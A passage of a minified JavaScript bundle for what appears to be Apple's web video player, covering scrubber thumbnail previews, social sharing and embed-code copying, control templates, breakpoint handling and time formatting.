o({el:this.el.querySelector(".ac-video-trickplay-image"),player:this._player,numberOfImages:e.numberOfImages}),this._timeLabel=this.el.querySelector(".ac-video-trickplay-time"),this._chapterLabel=this.el.querySelector(".ac-video-trickplay-chapter-title"),this._bindMethods(),this._addEventListeners()},l=c.prototype;l._initPointerTracking=function(){this._scrubberView=this._player.controls.scrubberView,this._scrubberView&&(this._runnableTrack=this._scrubberView.el.querySelector(".ac-slider-runnable-track"),this._calcOffsets(),this._scrubberView.el.addEventListener("mouseover",this.show),this._scrubberView.el.addEventListener("mouseout",this.hide),this._scrubberView.el.addEventListener("focusin",this._onScrubberFocusIn),this._scrubberView.el.addEventListener("focusout",this._onScrubberFocusOut),this._scrubberView.el.addEventListener("mousedown",this._startScrubbing),this._scrubberView.el.addEventListener("mouseup",this._endScrubbing),this._scrubberView.el.addEventListener("mousemove",this._onTrackerUpdate),this._scrubberView.el.addEventListener("mousemove",this._setThumbnail),this._player.on("resize",this._throttledCalcOffsets),window.addEventListener("resize",this._throttledCalcOffsets))},l._bindMethods=function(){this.show=this.show.bind(this),this.hide=this.hide.bind(this),this._onDurationChange=this._onDurationChange.bind(this),this._onLoadedMetaData=this._onLoadedMetaData.bind(this),this._startScrubbing=this._startScrubbing.bind(this),this._endScrubbing=this._endScrubbing.bind(this),this._initPointerTracking=this._initPointerTracking.bind(this),this._onTrackerUpdate=this._onTrackerUpdate.bind(this),this._setThumbnail=this._setThumbnail.bind(this),this._calcOffsets=this._calcOffsets.bind(this),this._onScrubberFocusIn=this._onScrubberFocusIn.bind(this),this._onScrubberFocusOut=this._onScrubberFocusOut.bind(this),this._throttledCalcOffsets=s(this._calcOffsets,30)},l._startScrubbing=function(e){this._thumbnailHandler.el.classList.add("hidden"),this._scrubberView.el.removeEventListener("mousemove",this._setThumbnail),this._scrubberView.el.removeEventListener("mouseout",this.hide),document.addEventListener("mouseup",this._endScrubbing),document.addEventListener("mousemove",this._onTrackerUpdate)},l._endScrubbing=function(e){e.target===this._scrubberView.el&&this.hide(),this._scrubberView.el.addEventListener("mousemove",this._setThumbnail),this._scrubberView.el.addEventListener("mouseout",this.hide),document.removeEventListener("mouseup",this._endScrubbing),document.removeEventListener("mousemove",this._onTrackerUpdate),this._setThumbnail(e),this._thumbnailHandler.el.classList.remove("hidden")},l._calcOffsets=function(){this._onLoadedMetaData();var e=this._player.el.getBoundingClientRect();this._offsetLeft=e.left;var t=this._runnableTrack.getBoundingClientRect();this._leftBoundary=t.left-this._offsetLeft,this._rightBoundary=t.right-this._offsetLeft,this._imgWidth=this.el.firstElementChild.getBoundingClientRect().width},l._onLoadedMetaData=function(){var e=this._player.getMediaElement().videoWidth,t=this._player.getMediaElement().videoHeight,n=-1!==(this._player.getCurrentSrc()||"").indexOf("-tft-");this.el.classList.remove("square-video"),this.el.classList.remove("vertical-video"),this.el.classList.remove("tft-video"),n?(this.el.classList.add("tft-video"),this._thumbnailHandler.setVertical(!1)):e<t?(this.el.classList.add("vertical-video"),this._thumbnailHandler.setVertical(!0)):e===t?(this.el.classList.add("square-video"),this._thumbnailHandler.setVertical(!1)):this._thumbnailHandler.setVertical(!1)},l._addEventListeners=function(){this._player.on("durationchange",this._onDurationChange),this._player.once("controlsready",this._initPointerTracking),this._player.on("loadedmetadata",this._calcOffsets)},l._removeEventListeners=function(){this._player.off("durationchange",this._onDurationChange),this._player.off("controlsready",this._initPointerTracking),this._player.off("canplaythrough",this._canPlayThroughHander),this._player.off("playing",this._canPlayThroughHander),this._player.off("loadedmetadata",this._calcOffsets),this._player.off("resize",this._throttledCalcOffsets),window.removeEventListener("resize",this._throttledCalcOffsets),this._scrubberView.el.removeEventListener("mouseover",this.show),this._scrubberView.el.removeEventListener("mouseout",this.hide),this._scrubberView.el.removeEventListener("focusin",this._onScrubberFocusIn),this._scrubberView.el.removeEventListener("focusout",this._onScrubberFocusOut),this._scrubberView.el.removeEventListener("mouseout",this.hide),this._scrubberView.el.removeEventListener("mousemove",this._onTrackerUpdate),this._scrubberView.el.removeEventListener("mousemove",this._setThumbnail),document.removeEventListener("mouseup",this._endScrubbing),document.removeEventListener("mousemove",this._onTrackerUpdate)},l._getDuration=function(){return this._cachedDuration&&isNaN(this._cachedDuration)||(this._cachedDuration=Math.max(0,this._player.getDuration()-this._liveStreamLookback)),this._cachedDuration},l.setPopUpPosition=function(e){this.show();var t=e/this._getDuration()*(this._rightBoundary-this._leftBoundary)-this._imgWidth/2-1,n=this._leftBoundary+t;this.el.firstElementChild.style.left=n+"px",this._time=e,this._timeLabel.innerText=r.formatTime(e,this._getDuration()),this._refreshChapter(),this._setThumbnail()},l._onScrubberFocusIn=function(e){if(e.target.classList.contains("ac-slider-chapter-container")){this._calcOffsets();var t=Array.from(e.target.parentElement.children).indexOf(e.target),n=this._player.getChapters()[t]["start-time"];this.setPopUpPosition(n),this.show()}},l._onScrubberFocusOut=function(e){this.hide()},l._onTrackerUpdate=function(e){this._calcOffsets();var t=Math.min(Math.max(e.clientX-this._offsetLeft,this._leftBoundary),this._rightBoundary);this.el.firstElementChild.style.left=t-this._imgWidth/2+"px";var n=this._scrubberView.getClientXValue(e);this._cachedTrackerUpdate=e,this._setTimeFromPercentPosition(Math.max(n,0))},l._onDurationChange=function(e){this._cachedDuration=Math.max(0,this._player.getDuration()-this._liveStreamLookback),this._cachedTrackerUpdate&&(this._onTrackerUpdate(this._cachedTrackerUpdate),this._setThumbnail()),this.el.style.opacity="1"},l._setThumbnail=function(e){this._thumbnailHandler.setTime(this._time,this._getDuration())},l._setTimeFromPercentPosition=function(e){var t=e/this._scrubberView.getMax();this._time=Math.min(t*this._getDuration(),this._getDuration());var n=r.formatTime(this._time,this._getDuration());this._timeLabel.innerText=n,this._refreshChapter()},l._refreshChapter=function(){var e=this._player.getChapterForTime(this._time,0);if(e&&e.titles.length){var t=e.titles.find((function(e){return"en"===e.language}))||e.titles[0];this._chapterLabel.innerText=t.title,this._chapterLabel.classList.remove("hidden")}else this._chapterLabel.classList.add("hidden")},l.setData=function(e){this.el.style.opacity="0",this._canPlayThroughHander&&(this._player.off("canplaythrough",this._canPlayThroughHander),this._player.off("playing",this._canPlayThroughHander),this._canPlayThroughHander=null),e&&this._player.getReadyState()>2?(this.el.style.opacity="1",this._thumbnailHandler.setData(e),this._cachedTrackerUpdate&&(this._onTrackerUpdate(this._cachedTrackerUpdate),this._setThumbnail())):(this._thumbnailHandler.setData(null),e?(this._canPlayThroughHander=this.setData.bind(this,e),this._player.on("canplaythrough",this._canPlayThroughHander),this._player.on("playing",this._canPlayThroughHander)):this.el.style.opacity="1"),this._onLoadedMetaData()},l.show=function(e){e&&this._onTrackerUpdate(e),this.el.firstElementChild.classList.remove("hidden")},l.hide=function(){this.el.firstElementChild.classList.add("hidden")},l.destroy=function(){this._canPlayThroughHander&&(this._player.off("canplaythrough",this._canPlayThroughHander),this._player.off("playing",this._canPlayThroughHander)),this._removeEventListeners(),this._throttledCalcOffsets&&this._throttledCalcOffsets.cancel(),this._scrubberView=null},t.exports=c},{"../../utils/Time":388,"../../utils/liveStreamLookback":390,"../templates/overlays/trickplay-overlay.html":380,"./ThumbnailHandler":377,"@marcom/function-utils/throttle":307}],377:[function(e,t,n){"use strict";var i=function(e){this.el=e.el,this._player=e.player,this._imgWidth=e.imgWidth||144,this.el.style.backgroundSize=100*this._numberOfImages+"% 100%"},r=i.prototype;r.setVertical=function(e){this._imgWidth=e?81:144},r.getWidth=function(){return this._imgWidth},r.setData=function(e){if(!e)return this._imgUrl=null,void(this.el.style.backgroundImage="");if(e.url!==this._imgUrl){this._imgUrl=e.url,this._numberOfImages=parseInt(e.numberOfImages||120),this.el.style.backgroundSize=100*this._numberOfImages+"% 100%",this.el.style.backgroundImage="",this.el.classList.add("hidden");var t=this._loadImage(this._imgUrl).then(function(){this._imageLoadPromise===t&&(this.el.style.backgroundImage='url("'+this._imgUrl+'")',this._imageLoadPromise=null,this.el.classList.remove("hidden"))}.bind(this));this._imageLoadPromise=t}},r._loadImage=function(e){return new Promise((function(t,n){var i=new Image;i.onload=function(){t()},i.onerror=function(){n()},i.src=e}))},r.setTime=function(e,t){var n=e/t,i=Math.min(Math.round(n*this._numberOfImages),this._numberOfImages-1)/(this._numberOfImages-1)*100;this.el.style.backgroundPositionX=i+"%"},r.destroy=function(){this._imageLoadPromise&&this._imageLoadPromise.cancel()},t.exports=i},{}],378:[function(e,t,n){"use strict";var i=e("../templates/states/SharingState.html"),r=e("../templates/states/IFrameEmbed.html"),o=e("@marcom/ac-console/log"),s=e("@marcom/ac-clipboard/select"),a=e("@marcom/ac-social").Dialog,c=e("@marcom/ac-string/supplant"),l=e("../localization/Localization"),u=e("@marcom/ac-accessibility/helpers/TabManager"),h=void 0;try{h=e("@marcom/ac-analytics-share/factory/create")}catch(e){o("ac-analytics-share failed to load, are you sure you've included it?")}var d=e("@marcom/useragent-detect").os,p=d.ios||d.android,f=function(e){this.el||this._initializeElement(e.el,e.template),this._player=e.player,this._parentView=e.parentView,this._clickedShareButton=null,this._container=this.el.querySelector(".container"),this._sharingButtonContainer=this.el.querySelector(".sharing-button-container"),this._facebookButton=this.el.querySelector(".acv-fb-share"),this._twitterButton=this.el.querySelector(".acv-tw-share"),this._lineButton=this.el.querySelector(".acv-line-share"),this._copyLinkButton=this.el.querySelector(".copy-link"),this._copyEmbedCodeButton=this.el.querySelector(".copy-embed-code"),this._copyTextArea=this.el.querySelector(".copy-area"),this._copyCloseButton=this.el.querySelector(".textinput-close-button"),this._closeButton=this.el.querySelector(".close-button"),!1===e.analytics&&(h=null),p&&(this.el.firstChild.classList.add("mobile"),this._player.on("loadstart",function(){this._getClientWidth()>735&&this.el.firstChild.classList.add("mobile-large")}.bind(this))),this._bindMethods(),this._addEventListeners(),this._syncSocialShareHidden()},m=f.prototype;m._initializeElement=function(e,t){e?this.el=e:(this.el=document.createElement("div"),this._templateData=l.getTranslation(),this.el.innerHTML=c((t||i).toString(),this._templateData))},m.setData=function(e){if(e){if(this._parentView.show(),e.allowEmbed&&this.el.firstChild.classList.add("embed-enabled"),this._sharingUrl=e.originatorUrl||window.location.href,this._videoid=e.videoid,this._hideExtension=e.hideExtension,this._embedPath=e.embedpath||"https://www.apple.com/embed/",this._hideFacebook=e.hideFacebookShare||!1,this._hideTwitter=e.hideTwitterShare||!1,this._hideLine=void 0===e.hideLineShare||e.hideLineShare,this._title=e.title||"Video Player",this._syncSocialShareHidden(),this._container.classList.remove("textarea-active"),h&&!1!==e.analytics&&e.videoid)try{this._initAnalyticsAttributes(e),this._analyticsObserver||(this._analyticsObserver=h({context:this.el}))}catch(e){o("ac-analytics-share failed to load, are you sure you've included it?")}}else this._parentView.hide()},m._bindMethods=function(){this._doFacebookShare=this._doSocialShare.bind(this,a.FACEBOOK_SHARE),this._doTwitterShare=this._doSocialShare.bind(this,a.TWITTER_TWEET),this._doLineShare=this._doSocialShare.bind(this,a.LINE_SHARE),this._copyUrl=this._copyUrl.bind(this),this._copyEmbedCode=this._copyEmbedCode.bind(this),this._closeCopyArea=this._showTextArea.bind(this,!1),this._closeState=this._closeState.bind(this)},m._addEventListeners=function(){this._facebookButton&&this._facebookButton.addEventListener("click",this._doFacebookShare),this._twitterButton&&this._twitterButton.addEventListener("click",this._doTwitterShare),this._lineButton&&this._lineButton.addEventListener("click",this._doLineShare),this._copyLinkButton&&this._copyLinkButton.addEventListener("click",this._copyUrl),this._copyEmbedCodeButton&&this._copyEmbedCodeButton.addEventListener("click",this._copyEmbedCode),this._copyCloseButton&&this._copyCloseButton.addEventListener("click",this._closeCopyArea),this._closeButton&&this._closeButton.addEventListener("click",this._closeState)},m._removeEventListeners=function(){this._facebookButton&&this._facebookButton.removeEventListener("click",this._doFacebookShare),this._twitterButton&&this._twitterButton.removeEventListener("click",this._doTwitterShare),this._lineButton&&this._lineButton.removeEventListener("click",this._doLineShare),this._copyLinkButton&&this._copyLinkButton.removeEventListener("click",this._copyUrl),this._copyEmbedCodeButton&&this._copyEmbedCodeButton.removeEventListener("click",this._copyEmbedCode),this._copyCloseButton&&this._copyCloseButton.removeEventListener("click",this._closeCopyArea),this._closeButton&&this._closeButton.removeEventListener("click",this._closeState)},m._syncSocialShareHidden=function(){this._facebookButton&&(this._hideFacebook?this._facebookButton.classList.add("hide-button"):this._facebookButton.classList.remove("hide-button")),this._twitterButton&&(this._hideTwitter?this._twitterButton.classList.add("hide-button"):this._twitterButton.classList.remove("hide-button")),this._lineButton&&(this._hideLine?this._lineButton.classList.add("hide-button"):this._lineButton.classList.remove("hide-button"))},m._doSocialShare=function(e){this._clickedShareButton=null,this._copyLinkButton.classList.remove("active"),this._copyEmbedCodeButton.classList.remove("active"),this._showTextArea(!1),a.create(e,{url:this._sharingUrl,title:this._title})},m._showTextArea=function(e){e?(this._container.classList.add("textarea-active"),s(this._copyTextArea),p||this._copyTextArea.setAttribute("readonly","")):(this._container.classList.remove("textarea-active"),this._copyLinkButton.classList.remove("active"),this._copyEmbedCodeButton.classList.remove("active"),this._copyTextArea.removeAttribute("readonly"),this._clickedShareButton&&this._clickedShareButton.focus(),this._copyLinkButton.setAttribute("aria-label",this._templateData.copylink),this._copyEmbedCodeButton.setAttribute("aria-label",this._templateData.copyembed))},m._copyUrl=function(){this._clearTextArea(),this._copyTextArea.value=this._sharingUrl,this._copyLinkButton.classList.add("active"),this._copyLinkButton.setAttribute("aria-label",this._templateData.selectlink),this._showTextArea(!0),this._clickedShareButton=this._copyLinkButton,this._copyTextArea.setAttribute("aria-label",this._templateData.copylink),s(this._copyTextArea)},m._clearTextArea=function(){window.getSelection().removeAllRanges(),this._copyLinkButton.classList.remove("active"),this._copyEmbedCodeButton.classList.remove("active"),this._copyTextArea.removeAttribute("readonly")},m._copyEmbedCode=function(){this._clearTextArea(),this._copyTextArea.value=c(r,{videoid:this._videoid,embedCodePath:this._embedPath,width:this._player.getMediaWidth(),height:this._player.getMediaHeight(),title:this._title,extension:this._hideExtension?"":".html"}),this._copyEmbedCodeButton.classList.add("active"),this._copyEmbedCodeButton.setAttribute("aria-label",this._templateData.selectembed),this._showTextArea(!0),this._clickedShareButton=this._copyEmbedCodeButton,this._copyTextArea.setAttribute("aria-label",this._templateData.copyembed),s(this._copyTextArea)},m._focusFirstButton=function(){this._firstButton||(this._firstButton=u.getTabbableElements(this._sharingButtonContainer)[0]),this._firstButton.focus()},m.show=function(){this._container.classList.add("showing")},m.hide=function(){this._clickedShareButton=null,this._showTextArea(!1),this._container.classList.remove("showing")},m._getClientHeight=function(){return this.el.clientHeight},m._getClientWidth=function(){return this.el.clientWidth},m.destroy=function(){this._removeEventListeners()},m._closeState=function(){this._showTextArea(!1),0===this._player.getCurrentTime()||this._player.getEnded()?this._player.states.setState("initial"):this._player.states.setState("none")},m._getAnalyticsSource=function(){return"drawer"},m._initAnalyticsAttributes=function(e){var t=[];this._facebookButton&&t.push({button:this._facebookButton,title:"facebook",events:"event85"}),this._twitterButton&&t.push({button:this._twitterButton,title:"twitter",events:"event84"}),this._copyLinkButton&&t.push({button:this._copyLinkButton,title:"copy-link",events:"event89"}),this._copyEmbedCodeButton&&t.push({button:this._copyEmbedCodeButton,title:"copy-embed-code",events:"event101"});var n=(-1!==(e.url&&e.url.indexOf(".m3u8"))?"m3u8":"mp4")+" via html5",i=this._getAnalyticsSource(),r=e.videoid,o=document.head.querySelectorAll('meta[property="analytics-track"]');o=o?o[0].getAttribute("content"):"",t.forEach(function(e){e.button.setAttribute("data-analytics-click",""),e.button.setAttribute("data-analytics-share",JSON.stringify({title:r,events:e.events,prop2:o+" - "+r+" - "+e.title,prop18:n,eVar49:document.referrer,eVar54:document.location.href,eVar55:o+" - "+r,eVar70:i}))}.bind(this))},t.exports=f},{"../localization/Localization":373,"../templates/states/IFrameEmbed.html":383,"../templates/states/SharingState.html":384,"@marcom/ac-accessibility/helpers/TabManager":27,"@marcom/ac-analytics-share/factory/create":51,"@marcom/ac-clipboard/select":66,"@marcom/ac-console/log":69,"@marcom/ac-social":274,"@marcom/ac-string/supplant":300,"@marcom/useragent-detect":435}],379:[function(e,t,n){"use strict";t.exports='\n<div class="controls-container">\n\t<div class="{elementClassPrefix}-social-tray hidden"></div>\n\n\t<div class="center-button-container {elementClassPrefix}-play-pause-button-container">\n\t\t<div class="button-wrapper">\n\t\t\t<button type="button" class="ac-video-icon centered-button {elementClassPrefix}-play-pause-button {elementClassPrefix}-button no-autoplay" value="{playpause}" aria-label="{playpause}" role="button" tabindex="0" data-acv-active-area data-acv-draggable-area>\n\t\t\t\t<div class="loading-indicator-container"></div>\n\t\t\t</button>\n\t\t\t<span id=\'loading-status\' class="acv-visually-hidden" aria-live=\'polite\'></span>\n\t\t</div>\t\t\n\t</div>\n\n\t<div class="main-controls-container">\n\t\t<div class="ac-video-overlay-container"></div>\n\t\t<div class="main-controls">\n\t\t\t<div class="button-wrapper">\n\t\t\t\t<div class="main-controls-item controls-volume">\n\t\t\t\t\t<button type="button" class="ac-video-icon {elementClassPrefix}-toggle-mute-volume-button {elementClassPrefix}-button" value="{togglemutevolume}" aria-label="{togglemutevolume}" role="button" tabindex="0" data-acv-active-area></button>\n\t\t\t\t\t<div class="{elementClassPrefix}-volume-level-indicator" tabindex="0" aria-valuemin="0" aria-valuemax="100" min="0" max="100" aria-label="{adjustvolume}" role="slider" aria-orientation="vertical" step="0.05" data-acv-active-area></div>\n\t\t\t\t</div>\n\t\t\t</div>\n\n\t\t\t<div class="button-wrapper">\n\t\t\t\t<button type="button" class="ac-video-icon main-controls-item {elementClassPrefix}-text-tracks-toggle-button {elementClassPrefix}-button no-text-tracks" value="{captionscontrol}" aria-label="{captionscontrol}" role="button" tabindex="0" data-acv-active-area></button>\n\t\t\t\t<div class="ac-video-ax-tracks-selector-container">\n\t\t\t\t    <div class="ac-video-ax-tracks-scroll-container">\n                        <div class="ac-video-audio-selector-container">\n                            <span class="ac-video-audio-selector-title">{audiotrackscontrol}</span>\n                            <ul class="{elementClassPrefix}-audio-selector" role="radiogroup" aria-label="{audiotrackscontrol}" data-acv-active-area></ul>\n                        </div>\n                        <div class="ac-video-captions-selector-container">\n                            <span class="ac-video-captions-selector-title">{subtitlescontrol}</span>\n                            <ul class="{elementClassPrefix}-captions-selector" role="radiogroup" aria-label="{subtitlescontrol}" data-acv-active-area></ul>\n                        </div>\n\t\t\t\t    </div>\n                </div>\n\t\t\t</div>\n\n\t\t\t<div class="main-controls-item controls-progress">\n\t\t\t\t<div class="controls-progress-time controls-progress-time-1">\n\t\t\t\t\t<div class="{elementClassPrefix}-elapsed-time-indicator" role="text" tabindex="-1">\n\t\t\t\t\t\t<span class="label">{elapsed}</span>\n\t\t\t\t\t\t<span class="{elementClassPrefix}-elapsed-time">00:00</span>\n\t\t\t\t\t\t<span class="{elementClassPrefix}-time-maxwidth" aria-hidden="true">44:44</span>\n\t\t\t\t\t</div>\n\t\t\t\t</div>\n\t\t\t\t<div class="controls-progress-bar">\n\t\t\t\t\t<div class="{elementClassPrefix}-buffered-indicator"></div>\n\t\t\t\t\t<div class="{elementClassPrefix}-progress-indicator ac-slider-inactive" aria-label="progress-indicator" role="slider" precision="float" min="0" max="1" step="0.0005" value="0" tabindex="0" aria-valuemax="1" aria-valuemin="0" aria-valuenow="{value}" data-acv-active-area></div>\n\t\t\t\t</div>\n\t\t\t\t<div class="controls-progress-time controls-progress-time-2">\n\t\t\t\t\t<div class="{elementClassPrefix}-remaining-time-indicator" role="text" tabindex="-1">\n\t\t\t\t\t\t<span class="label">{remaining}</span>\n\t\t\t\t\t\t<span class="{elementClassPrefix}-remaining-time">-00:00</span>\n\t\t\t\t\t\t<span class="{elementClassPrefix}-time-maxwidth" aria-hidden="true">-44:44</span>\n\t\t\t\t\t</div>\n\t\t\t\t</div>\n                <div class="controls-progress-time controls-progress-dvr-label-container" role="button">\n                    \n                        <span class="live-stream-dvr-text">{live}</span>\n                    \n                </div>\t\n\t\t\t</div>\n\n\t\t\t<div class="main-controls-item live-stream">\n\t\t\t\t<span class="live-stream-text">{livestream}</span>\n\t\t\t</div>\n\t\t\t\n\n\t\t\t<div class="button-wrapper">\n\t\t\t\t<button type="button" class="ac-video-icon main-controls-item {elementClassPrefix}-airplay-button {elementClassPrefix}-button airplay-unsupported" value="{airplay}" aria-label="{airplay}" role="button" tabindex="0" data-acv-active-area></button>\n\t\t\t</div>\n\n\t\t\t<div class="button-wrapper">\n\t\t\t\t<button type="button" class="ac-video-icon main-controls-item {elementClassPrefix}-picture-in-picture-button {elementClassPrefix}-button picture-in-picture-unsupported" value="{pictureinpicture}" aria-label="{pictureinpicture}" role="button" tabindex="0" data-acv-active-area></button>\n\t\t\t</div>\n\n\t\t\t<div class="button-wrapper">\n\t\t\t\t<button type="button" class="ac-video-icon main-controls-item {elementClassPrefix}-full-screen-button {elementClassPrefix}-button fullscreen-unsupported" value="{fullscreen}" aria-label="{fullscreen}" role="button" tabindex="0" data-acv-active-area></button>\n\t\t\t</div>\n\t\t\t\n\t\t</div>\n\t</div>\n\n\t<div class="end-state-wrapper">\n\t\t<div class="end-state-container"></div>\n\t</div>\n\n\n</div>\n\n<div class="compass-wrapper" data-acv-active-area>\n\t<div class="compass-background ac-video-icon"></div>\n\t<div class="compass-arrows">\n\t\t<button class="compass-arrow-top ac-video-icon" aria-label="{threesixtyup}" role="button" tabindex="0"></button>\n\t\t<button class="compass-arrow-right ac-video-icon" aria-label="{threesixtyright}" role="button" tabindex="0"></button>\n\t\t<button class="compass-arrow-bottom ac-video-icon" aria-label="{threesixtydown}" role="button" tabindex="0"></button>\n\t\t<button class="compass-arrow-left ac-video-icon" aria-label="{threesixtyleft}" role="button" tabindex="0"></button>\n\t</div>\n\t<div class="compass-field ac-video-icon"></div>\n\t<div class="compass-ring ac-video-icon"></div>\n\t<button class="compass" aria-label="{threesixtyicon}" role="button" tabindex="0"></button>\n</div>\n'},{}],380:[function(e,t,n){"use strict";t.exports='<div class="ac-video-trickplay hidden" aria-hidden="true">\n    <div class="ac-video-trickplay-image">\n    </div>\n    <div class="ac-video-trickplay-chapter-title"></div>\n    <div class="ac-video-trickplay-time"></div>\n</div>'},{}],381:[function(e,t,n){"use strict";t.exports='\n<div class="ac-slider-ax-track" role="slider" aria-valuemin="0" aria-valuemax="1" ></div>\n<div class="ac-slider-runnable-track">\n\t<div class="ac-slider-hover-track">\n\t\t<div class="ac-slider-hover-notch"></div>\n\t</div>\n\t<div class="ac-slider-thumb">\n\t\t<div class="ac-slider-thumb-background-wrapper">\n\t\t\t<div class="ac-slider-thumb-overlay"></div>\n\t\t\t<div class="ac-slider-thumb-background"></div>\n\t\t</div>\n\t</div>\n\t<div class="ac-slider-chapters-track"></div>\n\t<div class="ac-slider-inner-track">\n\t\t<div class="ac-slider-buffered"></div>\n\t\t<div class="ac-slider-scrubbed"></div>\n\t</div>\n</div>\n'},{}],382:[function(e,t,n){"use strict";t.exports='<a class="end-state-link hidden"></a>'},{}],383:[function(e,t,n){"use strict";t.exports='<iframe src="{embedCodePath}{videoid}{extension}" width="{width}" height="{height}" title="{title}" allowfullscreen></iframe>'},{}],384:[function(e,t,n){"use strict";t.exports='<div class="sharing-state">\n    <div class="container" data-acv-active-area>\n        <div class="social-sharing-container">\n            <div class="sharing-button-container">\n                <button class="acv-fb-share ac-video-icon icon-share_fb" aria-label="{facebookshare}, {newwindow}"></button>\n                <button class="acv-tw-share ac-video-icon icon-share_twitter" aria-label="{twittershare}, {newwindow}"></button>\n                <button class="acv-line-share ac-video-icon icon-share_line" aria-label="{lineshare}, {newwindow}"></button>\n                <button class="copy-link ac-video-icon icon-share_link" aria-label="{copylink}"></button>\n                <button class="copy-embed-code ac-video-icon icon-share_embed" aria-label="{copyembed}"></button>\n            </div>\n        </div>\n        <div class="textarea-container">\n            <span>\n                <input class="copy-area form-textbox form-textbox-text disabled" type="text" id="copy-link" aria-label="{copylink}"></input>\n                <button class="textinput-close-button ac-video-icon icon-share_close" aria-label="{dismisscopy}"></button>\n            </span>\n        </div>\n    </div>\n</div>'},{}],385:[function(e,t,n){"use strict";t.exports='\n<div class="ac-slider-runnable-track">\n\t<div class="ac-slider-background"></div>\n\t<div class="ac-slider-thumb-wrapper">\n\t\t<div class="ac-slider-thumb">\n\t\t\t<div class="ac-slider-thumb-background-wrapper">\n\t\t\t\t<div class="ac-slider-thumb-background"></div>\n\t\t\t</div>\n\t\t</div>\n\t</div>\n\t<div class="ac-slider-inner-track">\n\t\t<div class="ac-slider-scrubbed"></div>\n\t</div>\n</div>\n'},{}],386:[function(e,t,n){"use strict";var i=e("@marcom/ac-event-emitter-micro").EventEmitterMicro,r=function(e){i.call(this),this.el=e.el||document.body,this.breakpoints=e.breakpoints.sort((function(e,t){return e.minWidth-t.minWidth})),this._player=e.player,this._breakPointsLength=this.breakpoints.length,this._addClasses=e.addClass,this._addEventListeners(),this._onResize()},o=i.prototype,s=r.prototype=Object.create(o);s.constructor=r,s._addEventListeners=function(){var e=this;this._boundOnResize=function(){e._onResize.apply(e,arguments)},window.addEventListener("resize",this._boundOnResize),window.addEventListener("orientationchange",this._boundOnResize),window.addEventListener("DOMContentLoaded",this._boundOnResize)},s._removeEventListeners=function(){window.removeEventListener("resize",this._boundOnResize),window.removeEventListener("orientationchange",this._boundOnResize),window.addEventListener("DOMContentLoaded",this._boundOnResize)},s._onResize=function(e){var t=this.el.clientWidth,n=this._currentBreakpoint;if(!1!==e&&this._player.refreshSize(),!n||!r.widthInBreakpoint(t,n)){var i=r.getBreakpointFromWidth(t,this.breakpoints,n,this._breakPointsLength);this._addClasses&&(this._currentBreakpoint&&this.el.classList.remove(n.name),this.el.classList.add(i.name)),this._currentBreakpoint=i,this.trigger("breakpointchange",i)}},s.getCurrentBreakpoint=function(){return this._currentBreakpoint},s.refresh=function(){this._onResize(!1)},s.destroy=function(){this._removeEventListeners(),o.destroy.call(this)},r.getBreakpointFromElement=function(e,t){return r.getBreakpointFromWidth(e.clientWidth,t)},r.getBreakpointFromWidth=function(e,t,n,i){for(var r=0,o=i||t.length;r<o;r++){var s=t[r];if(s!==n&&e>=s.minWidth&&e<=s.maxWidth)return s}return null},r.widthInBreakpoint=function(e,t){return e>=t.minWidth&&e<=t.maxWidth},t.exports=r},{"@marcom/ac-event-emitter-micro":122}],387:[function(e,t,n){"use strict";t.exports={setItem:function(e,t){return localStorage.setItem("acv-"+e,t)},getItem:function(e){return localStorage.getItem("acv-"+e)},hasItem:function(e){return null!==localStorage.getItem("acv-"+e)},removeItem:function(e){return localStorage.removeItem("acv-"+e)},VOLUME_LEVEL:"volume-level",VOLUME_MUTED:"volume-muted",CC_LANGUAGE:"cc-language",AUDIO_TRACK_TYPE:"audiotrack-type",AUDIO_TRACK_LANGUAGE:"audiotrack-language"}},{}],388:[function(e,t,n){"use strict";var i=e("@marcom/ac-string/supplant"),r={addLeadingZero:function(e,t){if(t=t||2,e<10||t>2)for(e=String(e);e.length<t;)e="0"+e;return e},formatTime:function(e,t,n){return isNaN(e)?"00:00":(e=this.splitTime(Math.floor(e),t,function(e){return this.addLeadingZero(e,n)}.bind(this)),i(t>=3600?"{PN}{hours}:{minutes}:{seconds}":"{PN}{minutes}:{seconds}",{PN:e.negativeModifier,hours:e.hours,minutes:e.minutes,seconds:e.seconds}))},splitTime:function(e,t,n){n=n||function(e){return e};var i={negativeModifier:"",hours:0,minutes:0,seconds:0};if(isNaN(e))return i;for(var r in i.negativeModifier=e<0?"-":"",e=Math.abs(e),i.hours=t>=3600?Math.floor(e/3600):0,i.minutes=i.hours?Math.floor(e/60%60):Math.floor(e/60),i.seconds=e%60,i)"number"==typeof i[r]&&"hours"!==r&&(i[r]=n(i[r]));return i},stringToNumber:function(e){for(var t=0,n=e.split(":");n.length;)3===n.length?t+=3600*parseFloat(n.shift()):2===n.length?t+=60*parseFloat(n.shift()):t+=parseFloat(n.shift());return t}};t.exports=r},{"@marcom/ac-string/supplant":300}],389:[function(e,t,n){"use strict";t.exports=e("../../../.versionfile")},{"../../../.versionfile":302}],390:[function(e,t,n){"use strict";t.exports=60},{}],391:[function(e,t,n){"use strict";var i={};t.exports=function(e){return i[e]||(i[e]=new Promise((function(t,n){var i=document.createElement("script");i.type="text/javascript",i.src=e,i.onload=t,i.onerror=n;try{document.body.appendChild(i)}catch(e){n(e)}}))),i[e]}},{}],392:[function(e,t,n){"use strict";var i="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(e){return typeof e}:function(e){return e&&"function"==typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e},r=e("@marcom/ac-object/clone");t.exports=function e(){var t=Array.prototype.slice.call(arguments);if(t.length<2)return r(t[0]);var n=r(t.shift(),!0),o=t.shift();for(var s in o)o.hasOwnProperty(s)&&(n.hasOwnProperty(s)&&"object"===i(n[s])?"object"===i(n[s])&&"object"===i(o[s])&&(n[s]=e(n[s],o[s])):n[s]=o[s]);return t.length?e.apply(null,[n].concat(t)):n}},{"@marcom/ac-object/clone":184}],393:[function(e,t,n){"use strict";t.exports=function(e){var t=!0,n=!1,i=void 0;try{for(var r,o=Array.from(e.textTracks)[Symbol.iterator]();!(t=(r=o.next()).done);t=!0)for(var s=r.value;s.cues&&s.cues.length&&s.cues[0].endTime<e.currentTime-60;)s.removeCue(s.cues[0])}catch(e){n=!0,i=e}finally{try{!t&&o.return&&o.return()}finally{if(n)throw i}}}},{}],394:[function(e,t,n){"use 